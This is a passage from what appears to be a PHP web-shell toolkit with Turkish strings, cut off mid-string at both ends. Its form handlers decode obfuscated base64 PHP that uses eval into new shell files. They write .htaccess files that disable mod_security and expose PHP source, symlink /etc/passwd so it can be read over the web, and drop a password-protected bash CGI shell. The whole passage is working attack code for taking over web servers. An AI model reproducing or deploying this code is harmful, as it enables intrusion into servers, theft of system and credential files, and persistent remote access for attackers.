dm5yVTgzZVNVSVV6SUNHcVZRb2E5MTJKejJZTXBvYWhnWW9OSFhYTkRBMWVmQ05kdFJHcWlkY3pB
RUEvTk00bkZvQ251YXRvak82MUVDN3Z1MmV6emprM2ZIVENlUjh1cWR5Sm5Hb0tNbkxBQjYxdGoy
cHU1TTFuNVF1RkdYQWp5MFFTUXZnUis2NUowZkhpU2J5ZmhXWkJCVjd5dG1GUDNIdDJIeERyUytM
ajFOLzdGaTB5TjFaV2dYMUdjcm9qU3NGcWRhaGNoaUJhdkJYb3pacmZsOFU3YlBOZ2xnSEtpRjN3
TXNkTDlQMDFKbklrek03NGMzVlJiSkJEZFZIZ3pCRWdycGIrcFZ4M0F6NjlLVzhoVGgwTzJDSm5a
VHljSms3b1lwM1Q0bHFJUkVnRnoybENPSjE0dnVidzNnN1VISHV4ZFhWMnArK2ZGaVJjdXUwMUNw
K0dSdmV3K0tYVnBkMldHMHhCT2ZidTVPWmtzb0dZODdKQ2dXMHFBTjZVTHloQnE2U3BOcERVMERw
a0d2Yks1RDd1Y1owSDhZTE9NN0VuRFNEWGRmVWliSmE1bkZ5cU5EWEY0VFZ0azBGdjdLa2xDUy9Q
QS9mK21wOGZBVHhEamZISWtkNFQwMk9GNnEwakVjZHNHZ0VBcnF0QktCdEVVSVdoV042V0lubVJ4
aHZ0T3d6NEpySzQybWk5bk4wenZQMWdGMzVIUDUxZnBCdmdXWm5HbkJDSU5zVFZBZmphSmdlNW50
RnAvY1VHMjFsU3dGUzB0ZWEySHZubWZCcXdCTTFjUHJsVkdJZ2Jyc3VCOU1icTZ5elNlNmlSUUNu
a1l5b3NXTlc4UnpxaXU0VW9xR3lWTjZlL2FKNy84MGVqM0VzYU9KcHZuU1JZS0tmR2N1K1dadXBq
SXRTUmdHU1hrR0ZtalhmMTRsWlBMbDhSNmw4MjJjSFpYcXVtY3hIVHVOMldteFpuWmxXMzdMZUFS
QWdGYzdpbk9ieExhT0JDOXhXTmpXNUFUQnFNT0ZRTVJhU2NrUjc0NWwycThZR3BZSnR2YzlCN3RC
dW1ZRXhkN1V6T2M0MnluMytmTmJRdHYyVk9GMUFUMHBLYmkyM0Y3RUZMMjZZSWQvS2ZOTnpYOGx2
anNwVkk0NzV5VWV5YUh5UGJtT2V3UzQwSVB3bTFINUE2V3VFNk11eUExYnB2NXM4K1NuSFZKZTM1
Tm15aEZ5U3VnUFY5NEVKeTdpcXozQmxBeERvQlFMdTYyVElDaG9lbVRGcE1ab3hRcnAraHVZWUk2
c2NMajVSQW5WRnlRc1ZJSXlHQUJpUjlTSW81UjUxUWdtMWhXRHBtekgvaW5XNStlNXVoMUEwZHBS
alI2NUw4YXYwZFBCNnZWSnFQV1lZVTA0dVRFYVMrVldueFptMnVKYUFDOTl6TUFFWTlwWm1oZU5S
NmZsZ2pYdmdWTXp2MjFoNHhZRlZTb01NODg5Ly92WDNMZEQvQThyKzVlLy8rQmM9J1x4MjlceDI5
XHgyOVx4M0IiKTsKPz4=';

$file = fopen("pyb.php" ,"w+");
$write = fwrite ($file ,base64_decode($pac));
fclose($file);
   echo "<iframe src=pyb/pyb.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit30']))
{
    mkdir('zero', 0755);
    chdir('zero');

$zor = 'PD9waHAKZXZhbCgiXHg2NVx4NzZceDYxXHg2Q1x4MjhceDY3XHg3QVx4NjlceDZFXHg2Nlx4NkNc
eDYxXHg3NFx4NjVceDI4XHg2Mlx4NjFceDczXHg2NVx4MzZceDM0XHg1Rlx4NjRceDY1XHg2M1x4
NkZceDY0XHg2NVx4MjgnVFZhM0RzVFlEZndYTjdhaFFscGx3Wld5bnVJcUIxeWp1RXFybkwvZWV6
NERkakVZY0dZSUVDd0lsa2ZhLytOdmYxd2s4Y2RGa1Q5Ky9jRC9jYUgwajZtZnh2NlkrVUg4Z2Z6
TCt6TkQ0WC8xL0NlSC9sZkQvdEt3WHc3NytZVDBxLytiSS8vMC9xOUc2YjlmUVlvSnE2ZDExUm1w
M3N5eEdTcmtyTWpzbFZmaWZJUmcwOXBEMVMva0dCOHVIdzlOY01uNUU4ZW1uSkk3OWJoNEJFUDBX
cGk0QXVmcVc5WnBGczZWcCtCaFZ5ZHdvcTRtaGJhclJvQmViMm9DbVFnLzhGMEpjQmZWTUtXT0hs
MUJtM25SU1FYZlNFWDc4UDVXTkFVaVd6TENQYW9qbUdCNklQOGJsSVo4d3F4SVdpeURRUlhwM3dn
RWY2ZXZudS9qSnpkRU9kbGxvNmltSWRjR2FCOHZUZG5IRVNKRWY5T2UvV0hqSjZnSDJHNnZzOWxQ
ajhTZFpaS3BSeXkzTUh1R3RzZ0dINVgydzV3bW9sOVc1VlYzSllPL2U0Uk9HODFuRmhKL0ZoSVR2
UFRiQ0hLM3dSWlRWVS9ad1NmcXcvbFJ3VDBGd1VTazhheVdxQkRoa0RKNW53MklBOWdWM2hBR1FV
bnNpbVJGZUp6WktMWkJNRmJFa3MwZGFqZVY5MTZ0RnE4ejJvSGE0K2JDOGFkN0dSdlhpR1d6RHQz
Q0hjdDBVVHJmaG1kT1B5NW9GSWhIR3ZhY1Z3SWdyT280Y2lwd0k2WTFyR3ZQb3NSamFyV3pzZWlY
c1VoVTBsbXJXSms2MXVmZXZ3bWlVMmxtSXVjK2ZzSHBIaFU3NGg5MXlTeWZhZURIRUtyYjhtdEhG
SDBQdGFMQVBkSEpUc3lUUUlTV2J4QTlyL0ZPSzRKY3ZSZiswTXY5Y0ovR2JnS0VYVmRRc2FzSnZh
ZUE5R2JBV2RreGZWbWQzQ3hDMVdGTUZSVGwrOEJxS2hzd2hHWFE1TVhXbDRCclJlRnZLUVk4aUV3
ZTBadytBblV3c2RHVDQzYWN1ak90N3RobXJVbEtUQkF3bittZ05yT2xlNmx4NHVpTGwwb1VBZ0d1
Vjc0dmtlSVRzZ3VNSEdCU0VXbi9vR1lmbklNRklmN1hPWU00TUdKY1BMcVg2WThveGdnbHdmaE9J
R1ZhNHNzZVBROWFnQW00K3BDSGxiczN4SDRIUjZKMnVUTDAyZlB3SzNzM29ETVZkS2JwUzN3WkRN
c2xTdXFrOGM3WnE1MklYOC9LSGgvRUw3Ymd1OXROOFhzYUFQOWJwelhhbHVFMjBFSTR0eHlSOVdX
dG9kaC93SkxxNysyRzVjenI4OGhBTVh3NWptaVRROGZNek9wb2UyRHFNRGlDb1liUlVEcmVWSFRZ
OWpuSGpvNUZobkdEYUI3dmhpbzFMMzc3eFVLTkh2bE5KZTA3TkxlMTlnTzdOd1lOeXhOV0FvcmNy
cldGUEVhUjNZanlsUXMwZzRDcUg5ZmlORmRhK3RKeEJYQlo1Q0xIRlB6MVhpdkVmVkN5em9Kajkr
OUwwRWVlb2RzYndTdDFJRFAyazZIMW5hRGI5Q1R1K1lvWWxEVnU3M3RzSDhyR2ZBTEszN2VTdkNO
cm1HVCtNc25xbEk5T2JmaTdid2JsOGJIMGtWc1JYNXd4czlHUE8rZ2JQZ1d4QkNLdzV6WmNuZzc1
Q281WmIrN0djc0t0emVQeHpzR0NKb0UrSnp1NXBOUTF3OHgrVWhFUGplYjgwRjY2NnI1MmFjRjFR
VGZtbTQwNzJEdGkrKzQ0ZURXbEhuUnpaMVlqMHJoQXdFSUswWUhJRWJyZDdQSnNOWmc5YTVtbGVT
YmdkQnA4ZUpqRFNMZUhKRkJDUEQ0bHBXU1VIMkl6dzRQcnRyZTVsWG5pZHI1ZzU5R0pqeTZDTEJW
bEt5WHlVRldwTnlwZUd1M0NTSUlNbVdyc01yemZaS3d2ZGlFM2RiMkkrUyt4QXZVU1pmaHF1VTZV
aVczbjgrZTcwY1NoMWpzR3NNY0xkcGpsTS9hL2N3Z0ZqbWcwSHRhS0xMc3JRbmUxUXVFRHdoc0V0
OVl3dnhVMnhyNi94ZFI3eGlCL2k5YW1zTzBOVWlvd2NrUFgwSnZDSXJ2d0FpRXhWM09uYnJjRGRn
WkJPZUJxaDJFd0lSc1REWHJyMEhQcHVXUHovSGkwTTFVRmhzTi9XNE9sUnQ5ckk3S0JtL3YyU2pH
Y3h1MkM4eUVtdUJQRzYvRTgybVl4R3EyNjkxb1AyVncxSEFoZTQzUXAwWVpVK1NndlhCa29BdkpN
akVOK2Nzd3RmMFAyS0s5emN6NUZkR2ZxbmZSeGJNMmdBQW5JMXI1bWQzU3h1Um02U3F3UmREZ1pw
bFJjdkVUN1NOT1RxYzJPUXlrWEtmTVpFSzZ4WFM2ckJPSTJ2Z2J5bFVNa0s3ZFZpQlVHYkVQUlBi
L0RJN25rRFc3Zy9jTm9RYS8xaHYrbGVGYjVicmV0eU1yTmE3WUlQb0RDUXZyZ2FNeTJWOFkyT3Nv
WTdaai9IRUNWaklzS0I1WVlYaE9iZjdUNWQ2dm1rdkEyTlRPK2hJVW0zdlExZHJHUlVyNndKenhm
RUUwUUNScEJBM00yTVFKQ0RrU0oxcUI2TjVSaHBwRHZsaTlwQWtUMEVUdkVJSnhoeGs2VWFVdWZi
aEtwVWEra1NIQ3E3MVJNWmJsaTA2dFp6ZG42ZlQ1N2FPV2Jad3FVbklmbUlQcTIzZnN1d1pLZVlD
cGZyWWx4NnFKY09EWTd4YjVBcGczNjNNOVJCM3BpOUtDTWtxb0hOKzdnUUpCdVN4RlVVd2JzVUlz
Z1hvaXprTlQrMTg3dXdVZW0zenRUMVlYNmJHQ0tiU0NvdVZpN3J4UXArT2ttVmxGc25wN3puZzRr
SW0xcGRKR3JpS2phWnhwNnFXNmVSWDBmVG5GOVBxOWFjNjFYZUF4VmZFdXU1WGhIRm4vbDNWUVp4
bjEyN0dVbHFURm5rOURMMWQxR0wvTVplYU1nRDRZeUVDK1lUZDE5V0d6MnVmMjlyUDdMclVmMjdm
U2hTdDdPc0I1QTZ2dVNDWkV2bEtBQTVseU93UXRvZ3RiRWlyOXVlSTJVSU1MMFpIbkxJbXhaWTR1
YzAzVFI2enNiY3FGWUl4MXFJeldHY0RoWkdlRzVKSHhuS3E0Smg1aDZlWE85ZEtGUUFnK09XM3Yr
dlJDdXpqQlVCclozQ1owOVFiSm5OemVYZlVyM3U1SUVNU0RnTE4wbTNPQWZQMm9yUUwvdUFLWjBZ
MHl3N1ZrZGs3b0NzRWpJZXI2di9jTGRJYzJkWEczeHd0VENvWnFZaUF2Qm1xY041SXNPeWVqanc2
KzdkTzd5RzVQaGwvaHNpL0wyRGpNR29YWGxZY295Vzl0dit5YjNRZFNXWDJybldNanZuYnNHTENL
L0ZLWklZWno3Kys5TFkvNEhqUHZiUC8vMWJ3PT0nXHgyOVx4MjlceDI5XHgzQiIpOwo/Pg==';

$file = fopen("rby.php" ,"w+");
$write = fwrite ($file ,base64_decode($zor));
fclose($file);
   echo "<iframe src=zero/rby.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit31']))
{
    mkdir('kok', 0755);
    chdir('kok');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options Indexes FollowSymLinks
DirectoryIndex ssssss.htm
AddType txt .php
AddHandler txt .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit32']))
{
    mkdir('kok1', 0755);
    chdir('kok1');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options all
DirectoryIndex Sux.html
AddType text/plain .php
AddHandler server-parsed .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok1 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit33']))
{
    mkdir('kok2', 0755);
    chdir('kok2');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options +FollowSymlinks
DirectoryIndex itti.html
RemoveHandler .php
AddType application/octet-stream .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.html');
   echo "<iframe src=kok2 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit34']))
{
    mkdir('kok3', 0755);
    chdir('kok3');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options All
DirectoryIndex ssss.html
addType txt .php
AddHandler txt .php
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok3 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit35']))
{
    mkdir('kok4', 0755);
    chdir('kok4');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options +FollowSymLinks
DirectoryIndex Sux.html
Options +Indexes
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok4 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit36']))
{
    mkdir('kok5', 0755);
    chdir('kok5');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options Indexes FollowSymLinks
DirectoryIndex ss.htm
AddType txt .php
AddHandler txt .php
<IfModule mod_autoindex.c>
IndexOptions
FancyIndexing
IconsAreLinks
SuppressHTMLPreamble
</ ifModule>
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok5 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit37']))
{
    mkdir('kok6', 0755);
    chdir('kok6');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok6 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit38']))
{
    mkdir('kok7', 0755);
    chdir('kok7');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "options all
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd izo.txt');
   echo "<iframe src=kok7 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit39']))
{
    mkdir('kok8', 0755);
    chdir('kok8');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options +FollowSymLinks
DirectoryIndex seee.html
RemoveHandler .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /1.txt');
   echo "<iframe src=kok8 width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit40']))
{
    mkdir('p99', 0755);
    chdir('p99');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cpc

AddHandler cgi-script .sh
AddHandler cgi-script .sh";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$rub = 'IyEvYmluL2Jhc2ggLWkKCiMKcGFzc3dvcmQ9IjEyMzQ1NiIKCgpmdW5jdGlvbiBjZ2lfZ2V0X1BP
U1RfdmFycygpCnsKICAgICMgY2hlY2sgY29udGVudCB0eXBlCiAgICBbICIke0NPTlRFTlRfVFlQ
RX0iICE9ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIF0gJiYgXAoJZWNobyAi
V2FybmluZzogeW91IHNob3VsZCBwcm9iYWJseSB1c2UgTUlNRSB0eXBlICJcCgkgICAgICJhcHBs
aWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQhIiAxPiYyCiAgICAjIHNhdmUgUE9TVCB2YXJp
YWJsZXMgKG9ubHkgZmlyc3QgdGltZSB0aGlzIGlzIGNhbGxlZCkKICAgIFsgLXogIiRRVUVSWV9T
VFJJTkdfUE9TVCIgXAogICAgICAtYSAiJFJFUVVFU1RfTUVUSE9EIiA9ICJQT1NUIiAtYSAhIC16
ICIkQ09OVEVOVF9MRU5HVEgiIF0gJiYgXAoJcmVhZCAtbiAkQ09OVEVOVF9MRU5HVEggUVVFUllf
U1RSSU5HX1BPU1QKICAgIHJldHVybgp9CgoKZnVuY3Rpb24gY2dpX2RlY29kZXZhcigpCnsKICAg
IFsgJCMgLW5lIDEgXSAmJiByZXR1cm4KICAgIGxvY2FsIHYgdCBoCiAgICAKICAgIHQ9IiR7MS8v
Ky8gfSUlIgogICAgd2hpbGUgWyAkeyN0fSAtZ3QgMCAtYSAiJHt0fSIgIT0gIiUiIF07IGRvCgl2
PSIke3Z9JHt0JSVcJSp9IiAKCXQ9IiR7dCMqJX0iICAgICAgIAoJCglpZiBbICR7I3R9IC1ndCAw
IC1hICIke3R9IiAhPSAiJSIgXTsgdGhlbgoJICAgIGg9JHt0OjA6Mn0gCgkgICAgdD0iJHt0OjJ9
IiAKCSAgICB2PSIke3Z9ImBlY2hvIC1lIFxcXFx4JHtofWAgCglmaQogICAgZG9uZQogICAgCiAg
ICBlY2hvICIke3Z9IgogICAgcmV0dXJuCn0KCgpmdW5jdGlvbiBjZ2lfZ2V0dmFycygpCnsKICAg
IFsgJCMgLWx0IDIgXSAmJiByZXR1cm4KICAgIGxvY2FsIHEgcCBrIHYgcwogICAgIyBnZXQgcXVl
cnkKICAgIGNhc2UgJDEgaW4KCUdFVCkKCSAgICBbICEgLXogIiR7UVVFUllfU1RSSU5HfSIgXSAm
JiBxPSIke1FVRVJZX1NUUklOR30mIgoJICAgIDs7CglQT1NUKQoJICAgIGNnaV9nZXRfUE9TVF92
YXJzCgkgICAgWyAhIC16ICIke1FVRVJZX1NUUklOR19QT1NUfSIgXSAmJiBxPSIke1FVRVJZX1NU
UklOR19QT1NUfSYiCgkgICAgOzsKCUJPVEgpCgkgICAgWyAhIC16ICIke1FVRVJZX1NUUklOR30i
IF0gJiYgcT0iJHtRVUVSWV9TVFJJTkd9JiIKCSAgICBjZ2lfZ2V0X1BPU1RfdmFycwoJICAgIFsg
ISAteiAiJHtRVUVSWV9TVFJJTkdfUE9TVH0iIF0gJiYgcT0iJHtxfSR7UVVFUllfU1RSSU5HX1BP
U1R9JiIKCSAgICA7OwogICAgZXNhYwogICAgc2hpZnQKICAgIHM9IiAkKiAiCiAgICAjIHBhcnNl
IHRoZSBxdWVyeSBkYXRhCiAgICB3aGlsZSBbICEgLXogIiRxIiBdOyBkbwoJcD0iJHtxJSUmKn0i
ICAjIGdldCBmaXJzdCBwYXJ0IG9mIHF1ZXJ5IHN0cmluZwoJaz0iJHtwJSU9Kn0iICAjIGdldCB0
aGUga2V5ICh2YXJpYWJsZSBuYW1lKSBmcm9tIGl0Cgl2PSIke3AjKj19IiAgICMgZ2V0IHRoZSB2
YWx1ZSBmcm9tIGl0CglxPSIke3EjJHAmKn0iICMgc3RyaXAgZmlyc3QgcGFydCBmcm9tIHF1ZXJ5
IHN0cmluZwoJIyBkZWNvZGUgYW5kIGV2YWx1YXRlIHZhciBpZiByZXF1ZXN0ZWQKCVsgIiQxIiA9
ICJBTEwiIC1vICIke3MvICRrIC99IiAhPSAiJHMiIF0gJiYgXAoJICAgIGV2YWwgIiRrPVwiYGNn
aV9kZWNvZGV2YXIgXCIkdlwiYFwiIgogICAgZG9uZQogICAgcmV0dXJuCn0KCiMgcmVnaXN0ZXIg
YWxsIEdFVCBhbmQgUE9TVCB2YXJpYWJsZXMKY2dpX2dldHZhcnMgQk9USCBBTEwKCnBhc3M9IlNB
VkVEUFdEPSRwYXNzd29yZCIKcGFzc3Y9YGVjaG8gJEhUVFBfQ09PS0lFIHwgYXdrICckcGFzc3wn
ICAtZjBgCgppZiBbICRjYzIgLWVxIDQgXSA7IHRoZW4KY2xlYXIKZWNobyAtZSAiU2V0LUNvb2tp
ZTogU0FWRURQV0Q9O1xuQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIgplY2hvICc8bWV0YSBo
dHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyI+JwpleGl0CmVsc2UKCmlmIFsgLW4gIiR4
eCIgIF0gOyB0aGVuCmVjaG8gLWUgIlNldC1Db29raWU6IFNBVkVEUFdEPSR4eDtcbkNvbnRlbnQt
dHlwZTogdGV4dC9odG1sXG5cbiIKZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29u
dGVudD0iMDsiPicKZWxzZQplY2hvIC1lICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iCmZp
CgpmaQplY2hvICdQR2gwYld3K1BIUnBkR3hsUGxKQlFqTlBWVTRnVTJobGJHdzhMM1JwZEd4bFBn
MEtQR2hsWVdRK0RRbzhjM1I1YkdVK0RRb05DbUp2WkhrTkNuc05DZ2xpWVdOclozSnZkVzVrT2lB
ak16TXpPdzBLQ1dOdmJHOXlPaUFqUmpWR05VWTFPdzBLRFFvSmNHRmtaR2x1WnpvZ01UQndlRHNO
Q2cwS2ZRMEtEUW9OQ21FNmJHbHVheXdnWW05a2VWOWhiR2x1YXcwS2V3MEtDV052Ykc5eU9pQWpS
a1k1T1RNek93MEtDWFJsZUhRdFpHVmpiM0poZEdsdmJqb2dibTl1WlRzTkNuME5DbUU2ZG1semFY
UmxaQ3dnWW05a2VWOWhkbWx6YVhSbFpBMEtldzBLQ1dOdmJHOXlPaUFqUmtZNU9UTXpPdzBLQ1hS
bGVIUXRaR1ZqYjNKaGRHbHZiam9nYm05dVpUc05DbjBOQ21FNmFHOTJaWElzSUdFNllXTjBhWFps
TENCaWIyUjVYMkZvYjNabGNnMEtldzBLQ1dOdmJHOXlPaUFqUmtaR1JrWkdPdzBLQ1hSbGVIUXRa
R1ZqYjNKaGRHbHZiam9nYm05dVpUc05DbjBOQ2cwS2RHVjRkR0Z5WldFTkNuc05DZ2xpYjNKa1pY
STZJREZ3ZUNCemIyeHBaRHNOQ2dsamRYSnpiM0k2SUdSbFptRjFiSFE3RFFvSkRRb0pZbUZqYTJk
eWIzVnVaRG9nSXpBd01Ec05DZ2xqYjJ4dmNqb2dJMlptWm1abVpqc05DbUp2Y21SbGNqb3hjSGdn
YzI5c2FXUWdJMkV4WVRGaE1Uc05DbkJoWkdScGJtYzZOWEI0SURJd2NIZzdJQTBLWW05eVpHVnlM
WEpoWkdsMWN6b3lOWEI0T3cwS0xXMXZlaTFpYjNKa1pYSXRjbUZrYVhWek9qSTFjSGc3SUM4cUlF
WnBjbVZtYjNnZ015NDJJR0Z1WkNCbFlYSnNhV1Z5SUNvdkRRb05DbjBOQ2cwS2FXNXdkWFFOQ25z
TkNnbGliM0prWlhJNklERndlQ0J6YjJ4cFpEc05DZ2xqZFhKemIzSTZJR1JsWm1GMWJIUTdEUW9K
YjNabGNtWnNiM2M2SUdocFpHUmxianNOQ2dsaVlXTnJaM0p2ZFc1a09pQWpNREF3T3cwS0NXTnZi
Rzl5T2lBalptWm1abVptT3cwS1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNBallURmhNV0V4T3cwS2NH
RmtaR2x1WnpvMWNIZ2dNakJ3ZURzZ0RRcGliM0prWlhJdGNtRmthWFZ6T2pJMWNIZzdEUW90Ylc5
NkxXSnZjbVJsY2kxeVlXUnBkWE02TWpWd2VEc2dMeW9nUm1seVpXWnZlQ0F6TGpZZ1lXNWtJR1Zo
Y214cFpYSWdLaThOQ2cwS2ZRMEthVzV3ZFhRdVluVjBkRzl1SUhzTkNtWnZiblF0Wm1GdGFXeDVP
aUJEYjNWeWFXVnlJRTVsZHpzTkNtTnZiRzl5T2lBalptWm1abVptT3cwS1ptOXVkQzF6YVhwbE9p
QXhObkI0T3cwS2NHRmtaR2x1WnpvZ01UQndlRHNOQ25SbGVIUXRaR1ZqYjNKaGRHbHZiam9nYm05
dVpUc05DaTEzWldKcmFYUXRZbTl5WkdWeUxYSmhaR2wxY3pvZ09IQjRPdzBLTFcxdmVpMWliM0pr
WlhJdGNtRmthWFZ6T2lBNGNIZzdEUW90ZDJWaWEybDBMV0p2ZUMxemFHRmtiM2M2SURCd2VDQXhj
SGdnTTNCNElDTmhZbUZpWVdJN0RRb3RiVzk2TFdKdmVDMXphR0ZrYjNjNklEQndlQ0F4Y0hnZ00z
QjRJQ05oWW1GaVlXSTdEUXAwWlhoMExYTm9ZV1J2ZHpvZ01YQjRJREZ3ZUNBemNIZ2dJelkyTmpZ
Mk5qc05DbUp2Y21SbGNqb2djMjlzYVdRZ0kyUmxaR0prWlNBeGNIZzdEUXBpWVdOclozSnZkVzVr
T2lBak9UQTVNRGt3SURzTkNuME5DaTVpZFhSMGIyNDZhRzkyWlhJZ2V3MEtZbUZqYTJkeWIzVnVa
RG9nSTBJd1FqQkNNRHNOQ24wTkNnMEtJR1JwZGk1aWIzZ05DbnNOQ21OdmJHOXlPaUFqTXpNek93
MEtZbTl5WkdWeU9qTndlQ0J6YjJ4cFpDQWpZVEZoTVdFeE93MEtjR0ZrWkdsdVp6b3hNSEI0SURR
d2NIZzdJQTBLWW1GamEyZHliM1Z1WkRvalpUaGxPR1U0T3cwS2QybGtkR2c2T1RRbE93MEtZbTl5
WkdWeUxYSmhaR2wxY3pveU5YQjRPdzBLTFcxdmVpMWliM0prWlhJdGNtRmthWFZ6T2pJMWNIZzdJ
QzhxSUVacGNtVm1iM2dnTXk0MklHRnVaQ0JsWVhKc2FXVnlJQ292RFFwOURRbzhMM04wZVd4bFBn
MEtQQzlvWldGa1BnMEtQR0p2WkhrK0RRbzhZMlZ1ZEdWeVBnMEtQSEJ5WlQ0TkNpNWZYMTlmWDE4
Z0lDQWdJQ0FnSUNBZ1gxOWZJQ0FnSUNBZ0xsOWZYMTlmWHlBZ0lDQmZYMTlmSUNBZ0lDQmZYMTlm
WDE4Z0lDQWdYMThnSUNBZ1gxOGdJQzVmWHlBZ0lGOWZMaUFnSUNBZ0lDQWdJRjlmWDE5ZlgxOHVJ
RjlmSUNBZ0lGOWZJQ0FnWDE5ZlgxOWZYeUFnWDE4Z0lDQWdJQ0FnWDE4Z0lDQWdJQ0FOQ253Z0lD
QmZJQ0JjSUNBZ0lDQWdJQ0F2SUNBZ1hDQWdJQ0FnZkNBZ0lGOGdJRndnSUh4ZlgxOGdYQ0FnSUM4
Z0lGOWZJQ0JjSUNCOElDQjhJQ0I4SUNCOElId2dJRndnZkNBZ2ZDQWdJQ0FnSUNBZ0x5QWdJQ0Fn
SUNCOGZDQWdmQ0FnZkNBZ2ZDQjhJQ0FnWDE5ZlgzeDhJQ0I4SUNBZ0lDQjhJQ0I4SUNBZ0lDQU5D
bndnSUh4ZktTQWdmQ0FnSUNBZ0lDOGdJRjRnSUZ3Z0lDQWdmQ0FnZkY4cElDQjhJQ0FnWDE4cElI
d2dmQ0FnZkNBZ2ZDQWdmQ0I4SUNCOElDQjhJQ0I4SUh3Z0lDQmNmQ0FnZkNBZ0lDQWdJQ0I4SUNB
Z0tDMHRMUzFnZkNBZ2ZGOWZmQ0FnZkNCOElDQjhYMThnSUNCOElDQjhJQ0FnSUNCOElDQjhJQ0Fn
SUNBTkNud2dJQ0FnSUNBdklDQWdJQ0FnTHlBZ0wxOWNJQ0JjSUNBZ2ZDQWdJRjhnSUR3Z0lDQjhY
MThnUENBZ2ZDQWdmQ0FnZkNBZ2ZDQjhJQ0I4SUNCOElDQjhJSHdnSUM0Z1lDQWdmQ0FnSUNBZ0lD
QWdYQ0FnSUZ3Z0lDQWdmQ0FnSUY5ZklDQWdmQ0I4SUNBZ1gxOThJQ0I4SUNCOElDQWdJQ0I4SUNC
OElDQWdJQ0FOQ253Z0lIeGNJQ0JjTFMwdExTNHZJQ0JmWDE5Zlh5QWdYQ0FnZkNBZ2ZGOHBJQ0I4
SUNCZlgxOHBJSHdnZkNBZ1lDMHRJQ0FnZkNCOElDQmdMUzBnSUNCOElId2dJSHhjSUNBZ2ZDQWdJ
Q0F1TFMwdExTa2dJQ0I4SUNBZ2ZDQWdmQ0FnZkNBZ2ZDQjhJQ0I4WDE5Zlh5QjhJQ0JnTFMwdExT
NThJQ0JnTFMwdExTNE5DbndnWDN3Z1lDNWZYMTlmWHk5Zlh5OGdJQ0FnSUZ4Zlgxd2dmRjlmWDE5
Zlh5OGdJSHhmWDE5Zkx5QWdJRnhmWDE5ZlgxOHZJQ0FnWEY5ZlgxOWZYeThnSUh4Zlgzd2dYRjlm
ZkNBZ0lDQjhYMTlmWDE5Zlh5OGdJQ0FnZkY5ZmZDQWdmRjlmZkNCOFgxOWZYMTlmWDN4OFgxOWZY
